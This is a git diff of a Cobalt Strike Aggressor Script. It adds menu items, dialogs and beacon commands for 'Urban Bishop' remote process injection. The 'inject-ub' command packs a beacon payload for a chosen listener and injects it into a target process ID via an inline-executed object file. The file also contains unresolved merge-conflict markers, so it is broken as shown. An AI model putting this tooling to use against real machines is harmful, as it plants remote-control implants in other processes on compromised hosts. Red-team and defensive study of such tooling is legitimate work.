@@ -51,8 +51,29 @@ item "RemoteProcessInjection"{
     }
     
 
+<<<<<<< HEAD
+=======
+    local('$bid');
+        foreach $bid ($1){
+            rpi64($bid);
+      }
+      
+  }
+ 
+
+    } #End Menu
+ 
     
-}    
+item "Urban Bishop Injection by Sk3w" {
+
+    local('$bid');
+        foreach $bid ($1){
+            urbanbishopinjection($bid);
+      }
+      
+  }
+>>>>>>> 15a96f2194f43a49cd02da133d6e234e71507f65
+    
     ###################################		         		###################################
 #######################################		         		#######################################
   #####################################		         		#####################################
@@ -111,6 +132,7 @@ sub smbexeccsharp{
     dbutton_action($dialog, "Execute");
 	dialog_show($dialog);
 }
+<<<<<<< HEAD
  
 ########################
 ##
@@ -138,3 +160,64 @@ sub rpi86{
 }
 
     
+=======
+
+
+
+
+
+
+
+#################################
+#
+#
+# Sk3w's Urban Bishop Injection (Command Registers)
+#
+#################################
+
+alias getversion {
+    local('$barch $handle $data');
+    $barch  = barch($1);
+    $handle = openf(script_resource("/exe/getversion. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    beacon_inline_execute($1, $data, "go");
+}
+
+beacon_command_register(
+    "getversion",
+    "get windows major.minor.build version",
+    "Usage: getversion");
+
+alias inject-ub {
+    local('$barch $handle $data $payload $args');
+    $barch  = barch($1);
+    $handle = openf(script_resource("/exe/inject_urbanbishop. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $payload = artifact_payload($3, "raw", $barch);
+    $args = bof_pack($1, "ib", $2, $payload);
+    beacon_inline_execute($1, $data, "inject", $args);
+}
+
+beacon_command_register(
+    "inject-ub",
+    "inject beacon using urbanbishop technique",
+    "Usage: inject-ub [pid] [listener]");
+    
+    
+    
+sub urbanbishopinjection{
+    $bid = $1;
+    $dialog = dialog("Code Injection With Urban Bishop", %(pid => "", listener => "",), lambda({
+		btask($bid, join(' ', @("Injecting into", $3["pid"], "with listener", $3["listener"])));
+		fireAlias($bid, "inject-ub", $3['pid'], $3['listener']);
+   
+    }));
+    dialog_description($dialog, "Inject into Remote Process with Urban Bishop");
+    drow_text($dialog, "pid",  "Process ID to inject into");
+    drow_listener_stage($dialog, "listener",  "Listener to Spawn");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+>>>>>>> 15a96f2194f43a49cd02da133d6e234e71507f65
